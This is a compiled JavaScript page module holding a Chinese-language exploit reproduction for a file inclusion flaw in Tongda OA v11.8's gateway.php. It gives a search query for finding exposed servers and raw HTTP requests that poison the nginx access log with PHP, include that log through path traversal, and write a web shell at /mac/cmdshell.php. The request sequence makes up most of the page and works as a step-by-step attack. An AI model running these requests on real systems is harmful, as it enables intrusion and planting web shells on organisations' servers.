import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>通达OA v11.8 getway.php 存在文件包含漏洞，攻击者通过发送恶意请求包含日志文件导致任意文件写入漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>通达OA v11.8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;TDXK-通达OA&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201545994.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送恶意请求让日志被记录</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /d1a4278d?json={}&amp;aa=&lt;?php                                                                                                                      ?&gt; HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201545324.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在通过漏洞包含日志文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /ispirit/interface/gateway.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

json={&quot;url&quot;:&quot;/general/../../nginx/logs/oa.access.log&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201545558.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再次发送恶意请求写入文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /mac/gateway.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

json={&quot;url&quot;:&quot;/general/../../nginx/logs/oa.access.log&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201546852.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问写入的文件 <code>/mac/cmdshell.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201546179.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,20),s=[d];function l(r,c){return i(),a("div",null,s)}const g=e(t,[["render",l],["__file","通达OA v11.8 getway.php 远程文件包含漏洞.html.vue"]]);export{g as default};
